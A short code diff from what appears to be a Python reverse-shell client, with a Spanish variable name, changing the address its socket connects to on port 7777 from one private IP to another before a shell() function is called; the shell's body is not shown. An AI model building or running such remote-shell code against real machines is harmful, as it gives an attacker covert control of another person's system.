@@ -31,6 +31,6 @@ def shell():
 
 
 cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cliente.connect(('10.0.2.15', 7777))
+cliente.connect(('192.168.1.55', 7777))
 shell()
 cliente.close()
